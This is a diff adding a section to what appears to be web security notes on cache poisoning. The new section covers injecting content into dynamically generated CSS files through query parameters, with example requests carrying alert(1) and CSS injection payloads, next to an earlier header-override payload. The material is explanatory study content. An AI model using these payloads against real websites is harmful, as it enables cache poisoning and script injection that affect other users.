@@ -293,3 +293,31 @@ X-HTTP-Method-Override: POST
 callback=alert(1)
 ```
 As long as the ```X-HTTP-Method-Override``` header is unkeyed, you could submit a pseudo-POST request while preserving a GET cache key derived from the request line.
+
+### Exploiting Dynamic Content in Resource Imports
+ 
+Some CSS files reflect user input (query parameters) into their content dynamically. If improperly handled, this can allow attackers to inject malicious content into these CSS files. By combining this with **web cache poisoning**, the attacker can make others load and execute the malicious content.
+
+**Step-by-Step Breakdown:**
+
+1. **Dynamic CSS Import**:  
+   A CSS file dynamically includes user-provided data in its content, for example:  
+   ```
+   GET /style.css?excluded_param=123);@import…
+   ```
+   The server responds with a CSS file that includes the query parameter:  
+   ```css
+   @import url(/site/home/index.part1.css?excluded_param=123);@import…
+   ```
+
+2. **Attack Vector**:  
+   An attacker injects malicious content into the query parameter to alter the CSS:  
+   ```
+   GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1
+   ```
+   The server processes this input and reflects it into the CSS:  
+   ```css
+   This request was blocked due to…alert(1){}*{color:red;}
+   ```
+If this CSS is imported into other pages, it can potentially execute **malicious actions globally**.
+
